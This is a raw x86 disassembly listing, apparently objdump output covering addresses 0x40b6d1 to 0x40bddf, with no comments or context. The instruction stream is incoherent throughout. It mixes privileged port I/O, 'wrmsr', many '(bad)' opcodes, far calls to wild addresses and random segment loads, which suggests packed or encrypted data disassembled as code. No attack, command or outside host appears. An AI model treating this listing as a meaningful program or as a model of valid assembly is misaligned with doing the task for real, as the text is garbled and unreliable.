  40b6d1:	lods   al,BYTE PTR ds:[esi]
  40b6d2:	mov    BYTE PTR [esi+eax*2+0x3d5c24d5],cl
  40b6d9:	fiadd  WORD PTR [ecx-0x3]
  40b6dc:	fnsave [ecx+0x7f3ce199]
  40b6e2:	jmp    0xcac13133
  40b6e7:	scas   eax,DWORD PTR es:[edi]
  40b6e8:	aaa    
  40b6e9:	rcl    eax,1
  40b6eb:	sub    esi,esi
  40b6ed:	fld    DWORD PTR [eax]
  40b6ef:	in     al,dx
  40b6f0:	push   edx
  40b6f1:	aas    
  40b6f2:	bnd js 0x40b6f6
  40b6f5:	out    dx,al
  40b6f6:	loopne 0x40b723
  40b6f8:	stos   DWORD PTR es:[edi],eax
  40b6f9:	in     eax,0xcf
  40b6fb:	pop    esp
  40b6fc:	nop
  40b6fd:	fs aam 0xbf
  40b700:	mov    ebp,gs
  40b702:	aas    
  40b703:	fucomi st,st(2)
  40b705:	mov    ds:0x4d8dde9a,eax
  40b70a:	loope  0x40b705
  40b70c:	out    0x5,al
  40b70e:	clc    
  40b70f:	je     0x40b6cc
  40b711:	adc    edx,DWORD PTR [eax+edi*1-0x413e206b]
  40b718:	outs   dx,BYTE PTR ds:[esi]
  40b719:	jge    0x40b69c
  40b71b:	in     al,dx
  40b71c:	push   edi
  40b71d:	mov    edi,0xb6db096b
  40b722:	lods   al,BYTE PTR ds:[esi]
  40b723:	sub    esi,DWORD PTR [ecx+0x671bed21]
  40b729:	jl     0x40b771
  40b72b:	sub    eax,0x5e5c7a3e
  40b730:	out    0x87,eax
  40b732:	mov    edi,0xa836e014
  40b737:	clc    
  40b738:	mov    bl,0x5a
  40b73a:	push   edi
  40b73b:	jmp    0x40b704
  40b73d:	pop    esp
  40b73e:	sbb    al,0x60
  40b740:	cmp    eax,0xfb052ace
  40b745:	clc    
  40b746:	enter  0x53d4,0xba
  40b74a:	int3   
  40b74b:	ret    0x81c2
  40b74e:	xlat   BYTE PTR ds:[ebx]
  40b74f:	jns    0x40b6dd
  40b751:	(bad)  gs:[ecx+0x29]
  40b755:	sub    BYTE PTR [ecx-0x70],cl
  40b758:	pop    es
  40b759:	std    
  40b75a:	inc    edx
  40b75b:	not    BYTE PTR ds:0x7c9c5e86
  40b761:	mov    ds:0x8b75b10c,eax
  40b766:	xchg   esp,eax
  40b767:	or     al,0xd1
  40b769:	sub    ch,al
  40b76b:	call   0xcd931914
  40b770:	fcom   QWORD PTR [eax]
  40b772:	data16 sti 
  40b774:	dec    ebx
  40b775:	inc    ebx
  40b776:	clc    
  40b777:	add    al,0xd2
  40b779:	repz clc 
  40b77b:	call   0xb0b82c04
  40b780:	das    
  40b781:	mov    esp,0x101e37d3
  40b786:	(bad)  
  40b787:	jmp    0x40b78e
  40b789:	out    dx,al
  40b78a:	xchg   ebp,eax
  40b78b:	stos   BYTE PTR es:[edi],al
  40b78c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b78d:	dec    eax
  40b78e:	xor    ecx,DWORD PTR [edx+0x2]
  40b791:	stc    
  40b792:	mov    ds:0xe5ef011a,eax
  40b797:	cs call 0x8c1ce291
  40b79d:	push   ss
  40b79e:	stos   DWORD PTR es:[edi],eax
  40b79f:	in     eax,0xba
  40b7a1:	dec    edi
  40b7a2:	xchg   ebp,eax
  40b7a3:	into   
  40b7a4:	(bad)  
  40b7a5:	stc    
  40b7a6:	jo     0x40b751
  40b7a8:	or     ecx,ebp
  40b7aa:	cmp    al,bh
  40b7ac:	retf   
  40b7ad:	cld    
  40b7ae:	inc    esi
  40b7af:	(bad)  
  40b7b0:	push   es
  40b7b1:	out    dx,al
  40b7b2:	pop    ds
  40b7b3:	mov    al,0x20
  40b7b5:	mov    ebx,0xd68dff37
  40b7ba:	xchg   esp,eax
  40b7bb:	mov    bl,0xbc
  40b7bd:	js     0x40b73f
  40b7bf:	out    dx,eax
  40b7c0:	mov    dl,0xca
  40b7c2:	adc    ebx,DWORD PTR [esi]
  40b7c4:	icebp  
  40b7c5:	inc    ebp
  40b7c6:	fstp   TBYTE PTR [ecx]
  40b7c8:	and    bl,BYTE PTR [ebx+0x2]
  40b7cb:	xor    DWORD PTR [edi-0x258a4dc7],edx
  40b7d1:	in     al,dx
  40b7d2:	xchg   ebp,eax
  40b7d3:	cld    
  40b7d4:	fmul   QWORD PTR [eax]
  40b7d6:	stc    
  40b7d7:	arpl   WORD PTR [esi-0x5761cd1a],di
  40b7dd:	push   0xffffffc6
  40b7df:	jle    0x40b820
  40b7e1:	and    al,0x45
  40b7e3:	test   dl,cl
  40b7e5:	add    BYTE PTR [esi+0x6d],cl
  40b7e8:	mov    ah,0x64
  40b7ea:	cmp    BYTE PTR [eax],ah
  40b7ec:	jbe    0x40b801
  40b7ee:	cld    
  40b7ef:	pop    ds
  40b7f0:	add    ebp,DWORD PTR [ecx-0x72]
  40b7f3:	xor    BYTE PTR [ecx+0x27],al
  40b7f6:	jle    0x40b805
  40b7f8:	push   es
  40b7f9:	dec    ebp
  40b7fa:	aaa    
  40b7fb:	add    al,0x5b
  40b7fd:	cmp    eax,0x454c43c4
  40b802:	fwait
  40b803:	cmp    eax,0xfd03612c
  40b808:	sub    bh,BYTE PTR ds:0x6ea2700a
  40b80e:	xlat   BYTE PTR ds:[ebx]
  40b80f:	cld    
  40b810:	dec    ebx
  40b811:	mov    esi,0x48a2b321
  40b816:	sbb    edi,ecx
  40b818:	mov    edx,0xa05c7bfa
  40b81d:	adc    eax,0x6e6ecf21
  40b822:	jp     0x40b89b
  40b824:	inc    esi
  40b825:	in     al,0x17
  40b827:	or     ebx,DWORD PTR [esi]
  40b829:	pop    esp
  40b82a:	sti    
  40b82b:	(bad)  
  40b82c:	fiadd  DWORD PTR [ebp+0x54fbde2a]
  40b832:	lea    eax,[edx+0x6fccf66]
  40b838:	inc    edi
  40b839:	rcl    BYTE PTR [ebx],cl
  40b83b:	test   BYTE PTR [ecx],0x1
  40b83e:	fmul   DWORD PTR [eax-0x21]
  40b841:	xchg   ebp,eax
  40b842:	or     eax,0xc3cd65d2
  40b847:	into   
  40b848:	nop
  40b849:	sbb    eax,0xb5c7220a
  40b84e:	neg    DWORD PTR [edi-0x43]
  40b851:	icebp  
  40b852:	adc    DWORD PTR [ecx],0xffffffe7
  40b855:	fs mov esp,0x43b9eda8
  40b85b:	push   es
  40b85c:	mov    edi,0xffa4b213
  40b861:	call   0xd5b9:0xed9c712
  40b868:	mov    ch,0xc3
  40b86a:	xchg   BYTE PTR [ebx],ah
  40b86c:	or     esi,DWORD PTR [edx-0x56]
  40b86f:	xor    eax,0xc59e420b
  40b874:	leave  
  40b875:	xor    eax,0xb6919a86
  40b87a:	aaa    
  40b87b:	int3   
  40b87c:	sub    DWORD PTR [ebx+ebp*8],ebp
  40b87f:	bswap  eax
  40b881:	bound  ebp,QWORD PTR [ecx+0xe]
  40b884:	ja     0x40b882
  40b886:	mov    cl,ch
  40b888:	sub    ecx,DWORD PTR [esi]
  40b88a:	pop    eax
  40b88b:	and    esp,DWORD PTR [edx+0x37]
  40b88e:	pop    edi
  40b88f:	add    al,0x2
  40b891:	repnz stos BYTE PTR es:[edi],al
  40b893:	sub    ebx,eax
  40b895:	fisubr DWORD PTR [ecx-0x37e6c3e8]
  40b89b:	sub    al,0xeb
  40b89d:	fsub   st(7),st
  40b89f:	mov    al,0x93
  40b8a1:	je     0x40b8b5
  40b8a3:	xchg   ebx,eax
  40b8a4:	ss aas 
  40b8a6:	js     0x40b893
  40b8a8:	mov    bl,0xdb
  40b8aa:	retf   0xf951
  40b8ad:	mov    ecx,0x59edb95e
  40b8b2:	and    eax,0x2935fe72
  40b8b7:	mov    esp,0x5bcc687d
  40b8bc:	xchg   ecx,eax
  40b8bd:	dec    ecx
  40b8be:	jne    0x40b8e6
  40b8c0:	jp     0x40b8ee
  40b8c2:	into   
  40b8c3:	jb     0x40b87a
  40b8c5:	sahf   
  40b8c6:	xchg   edi,eax
  40b8c7:	rcr    DWORD PTR [esp+esi*4],0x68
  40b8cb:	scas   al,BYTE PTR es:[edi]
  40b8cc:	lods   al,BYTE PTR ds:[esi]
  40b8cd:	je     0x40b8e5
  40b8cf:	shr    esi,0x33
  40b8d2:	popf   
  40b8d3:	cdq    
  40b8d4:	adc    eax,0xfe543447
  40b8d9:	mov    al,0x4b
  40b8db:	lds    edi,FWORD PTR [ebx+0xd1ddafd]
  40b8e1:	inc    ecx
  40b8e2:	outs   dx,DWORD PTR ds:[esi]
  40b8e3:	mov    ah,bl
  40b8e5:	jns    0x40b894
  40b8e7:	popa   
  40b8e8:	inc    edi
  40b8e9:	mov    edi,0xce56d721
  40b8ee:	lahf   
  40b8ef:	jmp    0x40b8e8
  40b8f1:	pop    ebx
  40b8f2:	add    al,0x8f
  40b8f4:	push   eax
  40b8f5:	loope  0x40b8cd
  40b8f7:	push   edi
  40b8f8:	lds    ebx,FWORD PTR [eax+esi*8+0x19]
  40b8fc:	fstp   QWORD PTR ds:0xafc294c6
  40b902:	cwde   
  40b903:	fsubr  st(0),st
  40b905:	aaa    
  40b906:	je     0x40b8a4
  40b908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b909:	std    
  40b90a:	call   0x5b21:0xd22e63f2
  40b911:	or     esi,DWORD PTR [edx-0x1a]
  40b914:	mov    ebx,0xa9eab225
  40b919:	or     BYTE PTR [ecx+eiz*2+0x7a],0x85
  40b91e:	pop    ebx
  40b91f:	popa   
  40b920:	sbb    BYTE PTR [ebp-0x64],bl
  40b923:	je     0x40b99d
  40b925:	(bad)  
  40b927:	adc    BYTE PTR [eax],dl
  40b929:	sub    DWORD PTR [edi-0x5f],edx
  40b92c:	scas   eax,DWORD PTR es:[edi]
  40b92d:	stos   BYTE PTR es:[edi],al
  40b92e:	iret   
  40b92f:	mov    BYTE PTR [edx+0x77],dh
  40b932:	mov    ds:0x9367bac8,al
  40b937:	hlt    
  40b938:	lods   al,BYTE PTR ds:[esi]
  40b939:	outs   dx,DWORD PTR ds:[esi]
  40b93a:	adc    BYTE PTR [edi],ch
  40b93c:	outs   dx,DWORD PTR ds:[esi]
  40b93d:	and    DWORD PTR [ecx],edi
  40b93f:	mov    al,0xe8
  40b941:	mov    dl,0xce
  40b943:	cmp    DWORD PTR [ecx+0x2b],esp
  40b946:	mov    BYTE PTR [ebp+0x7be783ce],0x48
  40b94d:	add    dh,bh
  40b94f:	dec    eax
  40b950:	add    edx,ebx
  40b952:	mov    WORD PTR [eax],fs
  40b954:	arpl   WORD PTR [esi],ax
  40b956:	push   edi
  40b957:	(bad)  
  40b958:	or     al,0x91
  40b95a:	shr    BYTE PTR [eax-0x2951ac9],1
  40b960:	inc    ebx
  40b961:	ret    
  40b962:	push   edi
  40b963:	gs xor eax,esi
  40b966:	xor    ecx,DWORD PTR [edi-0x23]
  40b969:	arpl   WORD PTR [esi+0x74],sp
  40b96c:	pushf  
  40b96d:	add    eax,0xe0a3f2ab
  40b972:	rol    BYTE PTR [esi],0xb4
  40b975:	mov    dh,0x39
  40b977:	mov    WORD PTR [esi+0x778c60ce],?
  40b97d:	add    dl,cl
  40b97f:	jmp    0x2d9f:0x4e3143c2
  40b986:	cmp    eax,DWORD PTR [ecx+0x53]
  40b989:	loope  0x40b9e6
  40b98b:	mov    edi,0x892a3cec
  40b990:	mov    ecx,0x25c20c19
  40b995:	and    al,0xf3
  40b997:	stos   DWORD PTR es:[edi],eax
  40b998:	in     eax,dx
  40b999:	sbb    edi,ebp
  40b99b:	or     al,0x54
  40b99d:	dec    edx
  40b99e:	dec    edi
  40b99f:	ffreep st(3)
  40b9a1:	xchg   esi,eax
  40b9a2:	add    BYTE PTR [esi+0xdd97f47],al
  40b9a8:	cmp    esi,eax
  40b9aa:	shr    cl,0x4c
  40b9ad:	ret    
  40b9ae:	xor    DWORD PTR [eax+0x15],ebp
  40b9b1:	mov    al,ds:0x4cdf271e
  40b9b6:	jb     0x40b966
  40b9b8:	inc    eax
  40b9b9:	push   eax
  40b9ba:	xor    ebx,esi
  40b9bc:	stos   BYTE PTR es:[edi],al
  40b9bd:	sub    al,0xa8
  40b9bf:	mov    ecx,0x8f518965
  40b9c4:	adc    BYTE PTR [eax],0xa1
  40b9c7:	shl    DWORD PTR [ebp+0xf],1
  40b9ca:	stos   DWORD PTR es:[edi],eax
  40b9cb:	cli    
  40b9cc:	outs   dx,BYTE PTR ds:[esi]
  40b9cd:	ret    
  40b9ce:	jecxz  0x40b9a9
  40b9d0:	xor    edi,DWORD PTR [esi-0x678f0007]
  40b9d6:	mov    cl,0xee
  40b9d8:	std    
  40b9d9:	(bad)  
  40b9db:	ins    BYTE PTR es:[edi],dx
  40b9dc:	jne    0x40ba00
  40b9de:	mov    esi,0xee4ad3ae
  40b9e3:	out    dx,eax
  40b9e4:	push   ebp
  40b9e5:	xor    ebx,ebx
  40b9e7:	out    dx,eax
  40b9e8:	fdivr  st,st(2)
  40b9ea:	nop
  40b9eb:	cs in  al,dx
  40b9ed:	fimul  WORD PTR [edi]
  40b9ef:	imul   ecx,DWORD PTR [ebx+0x7d51586f],0xffffff91
  40b9f6:	sbb    BYTE PTR [esi+0x7e],ch
  40b9f9:	(bad)  
  40b9fa:	lock dec esi
  40b9fc:	shr    BYTE PTR [ebp-0x604bac3f],cl
  40ba02:	sub    DWORD PTR [ecx],eax
  40ba04:	lahf   
  40ba05:	mov    edi,0x68c0e7b5
  40ba0a:	adc    ecx,DWORD PTR cs:[ebp+0x2c]
  40ba0e:	int    0xeb
  40ba10:	cmp    cl,BYTE PTR [esi+0x20505841]
  40ba16:	mov    dl,0xbb
  40ba18:	popf   
  40ba19:	pushf  
  40ba1a:	push   eax
  40ba1b:	dec    esp
  40ba1c:	stos   DWORD PTR es:[edi],eax
  40ba1d:	and    DWORD PTR [esi-0x71],esp
  40ba20:	dec    ecx
  40ba21:	jmp    0x81a13a25
  40ba26:	xchg   ebp,eax
  40ba27:	cs push esp
  40ba29:	xor    al,BYTE PTR [ebx]
  40ba2b:	fs call 0x2dd:0xb5d2c254
  40ba33:	cmp    DWORD PTR [ecx],ebp
  40ba35:	push   0x4368a799
  40ba3a:	cli    
  40ba3b:	xor    esi,eax
  40ba3d:	xchg   edi,eax
  40ba3e:	aaa    
  40ba3f:	call   0x4273:0x5a0325ba
  40ba46:	or     esi,DWORD PTR [edi-0x2a]
  40ba49:	pop    ebp
  40ba4a:	inc    ebx
  40ba4b:	jmp    0xdddb:0x82b9d929
  40ba52:	push   ecx
  40ba53:	enter  0x8a88,0xf9
  40ba57:	pop    edi
  40ba58:	inc    edx
  40ba59:	test   DWORD PTR [esi],eax
  40ba5b:	sub    eax,0xaa9061c
  40ba60:	out    dx,eax
  40ba61:	jns    0x40ba4a
  40ba63:	mov    esp,0xdd460676
  40ba68:	aaa    
  40ba69:	retf   
  40ba6a:	and    DWORD PTR [edi+ebx*1],ecx
  40ba6d:	xchg   edi,eax
  40ba6e:	(bad)  
  40ba6f:	cmp    al,0xb
  40ba71:	xchg   BYTE PTR ds:0xed6a171c,ah
  40ba77:	shl    DWORD PTR [ebx],0x37
  40ba7a:	test   DWORD PTR [ebx],ebx
  40ba7c:	jle    0x40ba17
  40ba7e:	cld    
  40ba7f:	shl    DWORD PTR [edi-0x2f0c9c79],1
  40ba85:	in     eax,0xe9
  40ba87:	xchg   ebp,eax
  40ba88:	sub    BYTE PTR [edi-0x13],bh
  40ba8b:	std    
  40ba8c:	inc    ebx
  40ba8d:	jmp    0x40bafd
  40ba8f:	dec    esi
  40ba90:	popa   
  40ba91:	rol    DWORD PTR [ecx-0x12],1
  40ba94:	(bad)  
  40ba95:	and    al,0x59
  40ba97:	dec    ebp
  40ba98:	shl    BYTE PTR [edx-0x16],1
  40ba9b:	cmc    
  40ba9c:	jl     0x40ba3d
  40ba9e:	adc    DWORD PTR [esi+ecx*1],0xffffffea
  40baa2:	popf   
  40baa3:	push   ebp
  40baa4:	pop    esi
  40baa5:	inc    ecx
  40baa6:	xchg   ebp,eax
  40baa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baa8:	lods   eax,DWORD PTR ds:[esi]
  40baa9:	push   ecx
  40baaa:	dec    edi
  40baab:	mov    ebx,0xfb3657a7
  40bab0:	xor    eax,0xa4728ef1
  40bab5:	push   ebp
  40bab6:	imul   esp,DWORD PTR ds:0xbbca85a6,0xee0baff
  40bac0:	test   eax,0xddf40803
  40bac5:	adc    dh,ch
  40bac7:	sub    al,BYTE PTR [esi-0x2b]
  40baca:	iret   
  40bacb:	push   ds
  40bacc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bacd:	pop    esp
  40bace:	jo     0x40bb0e
  40bad0:	lahf   
  40bad1:	outs   dx,BYTE PTR ds:[esi]
  40bad2:	or     eax,0xa92a327
  40bad7:	xchg   esp,eax
  40bad8:	rcr    DWORD PTR [ecx-0x28],cl
  40badb:	rol    BYTE PTR [ebx+0x6d],0x2c
  40badf:	or     dh,al
  40bae1:	mov    dl,0xf6
  40bae3:	add    BYTE PTR [esi],0x1e
  40bae6:	push   edx
  40bae7:	(bad)  
  40bae8:	loope  0x40bb25
  40baea:	sub    BYTE PTR [eax+0x73],ah
  40baed:	jno    0x40bada
  40baef:	sub    edx,DWORD PTR [edi]
  40baf1:	push   ebx
  40baf2:	xchg   ebp,eax
  40baf3:	cmp    cl,BYTE PTR [eax]
  40baf5:	add    al,0x26
  40baf7:	sub    BYTE PTR es:[ebx],ah
  40bafa:	(bad)  
  40bafb:	cld    
  40bafc:	push   ds
  40bafd:	dec    esp
  40bafe:	sbb    edx,edx
  40bb00:	xchg   esp,eax
  40bb01:	dec    ebp
  40bb02:	and    eax,0x84cf4fb
  40bb07:	mov    ecx,0xeb910e7
  40bb0c:	push   esp
  40bb0d:	sbb    cl,ch
  40bb0f:	adc    eax,0x6e9f4683
  40bb14:	lods   al,BYTE PTR ds:[esi]
  40bb15:	cmp    ebp,DWORD PTR [edi-0x66]
  40bb18:	call   0xd0d5:0xdb0e0408
  40bb1f:	inc    esp
  40bb20:	adc    BYTE PTR [esi],0xb
  40bb23:	rcl    DWORD PTR [ebx-0x19],1
  40bb26:	fsubr  st(0),st
  40bb28:	je     0x40bb4b
  40bb2a:	sbb    BYTE PTR [eax],ah
  40bb2c:	vxorpd ymm4,ymm1,ymm7
  40bb30:	xchg   ebx,eax
  40bb31:	cdq    
  40bb32:	mov    eax,0xb67a7f69
  40bb37:	xchg   DWORD PTR [esi],eax
  40bb39:	inc    ecx
  40bb3a:	call   0x8d1f:0xd578399e
  40bb41:	dec    ebp
  40bb42:	push   ecx
  40bb43:	aas    
  40bb44:	daa    
  40bb45:	mov    ds:0xd399c39d,eax
  40bb4a:	(bad)  
  40bb4b:	(bad)  
  40bb4c:	(bad)  
  40bb4e:	pop    eax
  40bb4f:	(bad)  
  40bb50:	ja     0x40bae8
  40bb52:	fucomip st,st(4)
  40bb54:	cmp    ebx,DWORD PTR [ecx+0x34e888c3]
  40bb5a:	mov    edx,0x75d4d080
  40bb60:	lods   eax,DWORD PTR ds:[esi]
  40bb61:	aad    0x24
  40bb63:	dec    edi
  40bb64:	pop    eax
  40bb65:	popa   
  40bb66:	leave  
  40bb67:	fst    DWORD PTR [edi-0x46]
  40bb6a:	rcl    esp,1
  40bb6c:	cmp    ebp,DWORD PTR [ebp+0x1c]
  40bb6f:	sbb    al,0x3f
  40bb71:	lock addr16 (bad) 
  40bb74:	push   0xe32fa2b9
  40bb79:	(bad)  
  40bb7b:	mov    ds:0x7ea2d04,al
  40bb80:	ss push ds
  40bb82:	sbb    al,0xf2
  40bb84:	lock mov esp,0x6c1b39ea
  40bb8a:	into   
  40bb8b:	sub    DWORD PTR [edi-0x64a00d6f],0x70
  40bb92:	cmc    
  40bb93:	shl    dl,1
  40bb95:	push   es
  40bb96:	shl    BYTE PTR [edi-0x68],1
  40bb99:	push   esi
  40bb9a:	inc    edx
  40bb9b:	and    al,0x8
  40bb9d:	je     0x40bb77
  40bb9f:	ror    BYTE PTR [esi-0x9],cl
  40bba2:	into   
  40bba3:	fs mov ebx,0x5dbee0d6
  40bba9:	cdq    
  40bbaa:	dec    ecx
  40bbac:	ins    DWORD PTR es:[edi],dx
  40bbad:	cld    
  40bbae:	add    DWORD PTR [edx+0x18],edx
  40bbb1:	and    edi,DWORD PTR [esi+0x59d771ac]
  40bbb7:	loopne 0x40bbce
  40bbb9:	loop   0x40bb61
  40bbbb:	cmp    dl,BYTE PTR [edi]
  40bbbd:	sbb    bh,BYTE PTR [ecx-0x717d61fb]
  40bbc3:	mov    ds:0xa797c1b4,al
  40bbc8:	xchg   esp,eax
  40bbc9:	adc    dl,dh
  40bbcb:	test   BYTE PTR [eax+ecx*4+0x12],dh
  40bbcf:	pusha  
  40bbd0:	lods   eax,DWORD PTR ds:[esi]
  40bbd1:	mov    ebp,esi
  40bbd3:	xor    BYTE PTR [esp+eax*8],cl
  40bbd6:	jbe    0x40bc2c
  40bbd8:	test   al,0xb0
  40bbda:	scas   eax,DWORD PTR es:[edi]
  40bbdb:	jle    0x40bc52
  40bbdd:	sub    al,0x2b
  40bbdf:	dec    eax
  40bbe0:	ins    DWORD PTR es:[edi],dx
  40bbe1:	popa   
  40bbe2:	xchg   edx,eax
  40bbe3:	or     eax,0x6c6c1ef4
  40bbe8:	jp     0x40bc21
  40bbea:	aaa    
  40bbeb:	cli    
  40bbec:	vpcomd xmm1,xmm4,XMMWORD PTR [edi-0x49],0xc0
  40bbf3:	jne    0x40bc20
  40bbf5:	mov    ds:0xde7e175,eax
  40bbfa:	mov    ah,0xf1
  40bbfc:	outs   dx,DWORD PTR ds:[esi]
  40bbfd:	add    edi,DWORD PTR [eax+0x12d42ae3]
  40bc03:	repnz pop ss
  40bc05:	(bad)  
  40bc06:	push   eax
  40bc07:	push   edx
  40bc08:	jle    0x40bbda
  40bc0a:	or     DWORD PTR [ebx+0x41],ecx
  40bc0d:	scas   al,BYTE PTR es:[edi]
  40bc0e:	push   0xffffffe1
  40bc10:	lahf   
  40bc11:	adc    edx,DWORD PTR [ebx-0x5c]
  40bc14:	(bad)
  40bc17:	adc    BYTE PTR [edi+0x2f],bl
  40bc1a:	daa    
  40bc1b:	adc    DWORD PTR [ecx-0x61],0xe
  40bc1f:	daa    
  40bc20:	xlat   BYTE PTR ds:[ebx]
  40bc21:	and    BYTE PTR [ecx-0x1e],ch
  40bc24:	xor    eax,ebp
  40bc26:	pop    eax
  40bc27:	dec    BYTE PTR [edi]
  40bc29:	outs   dx,DWORD PTR ds:[esi]
  40bc2b:	(bad)  
  40bc2c:	cmp    BYTE PTR [ebp+0x68],bl
  40bc2f:	or     DWORD PTR [eax-0x59fd9771],ebp
  40bc35:	sbb    BYTE PTR [ebp+0x7c],dl
  40bc38:	xchg   esp,eax
  40bc39:	div    BYTE PTR [ecx-0x58]
  40bc3c:	add    ebp,edx
  40bc3e:	xchg   ecx,eax
  40bc3f:	jmp    0xf9f45714
  40bc44:	xor    eax,0x8dfba20c
  40bc49:	xor    edi,ebx
  40bc4b:	xor    DWORD PTR [edi+ecx*2],esi
  40bc4e:	(bad)  
  40bc4f:	bound  ebp,QWORD PTR [edx]
  40bc51:	sbb    bh,BYTE PTR [edi]
  40bc53:	call   0xf58809b6
  40bc58:	shl    BYTE PTR [edx],0x16
  40bc5b:	aaa    
  40bc5c:	pop    edx
  40bc5d:	data16 jg 0x40bc8f
  40bc60:	inc    esi
  40bc61:	mov    dh,0x2c
  40bc63:	push   0x4e
  40bc65:	inc    eax
  40bc66:	mov    BYTE PTR [ebx+esi*1+0x4a],ch
  40bc6a:	rcr    ebx,cl
  40bc6c:	lds    esi,FWORD PTR [ebx-0x64110725]
  40bc72:	xor    eax,0x17243fbc
  40bc77:	jne    0x40bc11
  40bc79:	cmp    DWORD PTR [esi+0x2c],ebx
  40bc7c:	cmp    edi,0xfffffff5
  40bc7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc80:	pop    ebp
  40bc81:	jbe    0x40bcb0
  40bc83:	push   ebp
  40bc84:	fisub  DWORD PTR ds:0x57531659
  40bc8a:	in     eax,0x68
  40bc8c:	out    0x4f,al
  40bc8e:	mov    cs,WORD PTR [ebp-0x1c97601d]
  40bc94:	push   0x28
  40bc96:	mov    eax,ds:0xacebd916
  40bc9b:	sub    eax,0xff4cc1c6
  40bca0:	scas   eax,DWORD PTR es:[edi]
  40bca1:	sub    DWORD PTR [ebx],0x6af02b96
  40bca7:	mov    ah,BYTE PTR [eax+0x48]
  40bcaa:	jmp    0xfee8:0x30197d61
  40bcb1:	add    BYTE PTR [eax+0x6c],dl
  40bcb4:	and    BYTE PTR [ebp+0x19b1a375],ch
  40bcba:	inc    edi
  40bcbb:	pop    ecx
  40bcbc:	test   al,0xac
  40bcbf:	mov    ?,WORD PTR [esi+0x65e8afd5]
  40bcc5:	wrmsr  
  40bcc7:	xor    edi,DWORD PTR [eax-0x3f883868]
  40bccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcce:	rol    BYTE PTR [esp+edi*1-0x42],1
  40bcd2:	fidivr WORD PTR [edi+0x59]
  40bcd5:	and    al,0x4b
  40bcd7:	es sbb al,0xf3
  40bcda:	mov    eax,ds:0xbf7d77ed
  40bcdf:	xor    al,0x38
  40bce1:	daa    
  40bce2:	jle    0x40bd04
  40bce4:	add    eax,0x52c37d2a
  40bce9:	loopne 0x40bd4e
  40bceb:	adc    DWORD PTR [ebx-0x17e9e0e],eax
  40bcf1:	(bad)  
  40bcf2:	cmp    bl,BYTE PTR [eax]
  40bcf4:	sub    BYTE PTR [ecx-0x4c],al
  40bcf7:	scas   al,BYTE PTR es:[edi]
  40bcf8:	push   es
  40bcf9:	fcmovne st,st(6)
  40bcfb:	test   al,0xfa
  40bcfd:	xchg   ebx,eax
  40bcfe:	adc    bh,BYTE PTR [eax+0x4f]
  40bd01:	gs addr16 aas 
  40bd04:	stc    
  40bd05:	add    eax,0x8b6bf0d0
  40bd0a:	dec    eax
  40bd0b:	ins    DWORD PTR es:[edi],dx
  40bd0c:	adc    ebx,edi
  40bd0e:	popf   
  40bd0f:	leave  
  40bd10:	mov    edi,0x4f1a389b
  40bd15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd17:	xor    eax,0xbd2573f0
  40bd1c:	stc    
  40bd1d:	popf   
  40bd1e:	out    dx,eax
  40bd1f:	lahf   
  40bd20:	jns    0x40bd3d
  40bd22:	xchg   ebx,eax
  40bd23:	push   eax
  40bd24:	in     eax,0xc7
  40bd26:	and    BYTE PTR [edi],ch
  40bd28:	repz pop ebp
  40bd2a:	adc    eax,0x5a47dcc6
  40bd2f:	inc    ebx
  40bd30:	mov    edx,0x190e310
  40bd35:	test   BYTE PTR [edx+ebx*4],0x5c
  40bd39:	ins    BYTE PTR es:[edi],dx
  40bd3a:	inc    ebx
  40bd3b:	mov    ds:0xe97c4356,al
  40bd40:	cmp    DWORD PTR [ecx+eax*1+0x47],ebx
  40bd44:	push   edx
  40bd45:	adc    DWORD PTR [ecx],eax
  40bd47:	jle    0x40bceb
  40bd49:	test   BYTE PTR ds:0x22d4a293,ah
  40bd4f:	inc    ecx
  40bd50:	dec    edx
  40bd51:	loope  0x40bd2d
  40bd53:	pop    dx
  40bd55:	dec    edx
  40bd56:	mov    al,ds:0x4acb9f25
  40bd5b:	pushf  
  40bd5c:	iret   
  40bd5d:	push   eax
  40bd5e:	mov    WORD PTR [edi+0x4dc42d81],ss
  40bd64:	inc    ebx
  40bd65:	mov    al,ds:0x383c9eb7
  40bd6a:	dec    esi
  40bd6b:	push   ebp
  40bd6c:	pushf  
  40bd6d:	addr16 mov eax,ds:0xdcb0
  40bd71:	ins    DWORD PTR es:[edi],dx
  40bd72:	repnz repnz sub bh,BYTE PTR [ecx]
  40bd76:	adc    al,0xfc
  40bd78:	adc    bl,BYTE PTR [eax-0x56]
  40bd7b:	enter  0x8bde,0xf3
  40bd7f:	jbe    0x40bd73
  40bd81:	lds    edx,FWORD PTR [ebp-0x41]
  40bd84:	arpl   WORD PTR [edi+0x3b],di
  40bd87:	dec    ebx
  40bd88:	xor    al,0x35
  40bd8a:	sub    BYTE PTR [esi+0x54],cl
  40bd8d:	sbb    eax,0x10d02a99
  40bd92:	xor    edi,edi
  40bd94:	(bad)  
  40bd95:	hlt    
  40bd96:	ins    DWORD PTR es:[edi],dx
  40bd97:	dec    ebp
  40bd98:	pop    es
  40bd99:	and    DWORD PTR [esi],esp
  40bd9b:	scas   eax,DWORD PTR es:[edi]
  40bd9c:	pop    eax
  40bd9d:	lods   eax,DWORD PTR ds:[esi]
  40bd9e:	loop   0x40bde3
  40bda0:	jbe    0x40bda8
  40bda2:	test   DWORD PTR [edi],edx
  40bda4:	xor    eax,ecx
  40bda6:	add    BYTE PTR [edx+0x14038745],ch
  40bdac:	fnstsw WORD PTR [edx]
  40bdae:	cs sbb eax,0xc7d9ce87
  40bdb4:	cli    
  40bdb5:	push   ebx
  40bdb6:	add    al,0x56
  40bdb8:	or     BYTE PTR [edi+0x59f3dbf],bl
  40bdbe:	cmp    eax,0x6c4d32ec
  40bdc3:	aas    
  40bdc4:	and    eax,0xd372e93e
  40bdc9:	xrelease xchg DWORD PTR gs:[ebx],edx
  40bdcd:	cmp    eax,0x21b33c36
  40bdd2:	adc    al,0x35
  40bdd4:	aaa    
  40bdd5:	add    esp,ecx
  40bdd7:	add    ecx,ebp
  40bdd9:	in     al,dx
  40bdda:	adc    ebx,DWORD PTR [edi-0x36]
  40bddd:	mov    dl,0xb8
  40bddf:	sbb    al,0x99
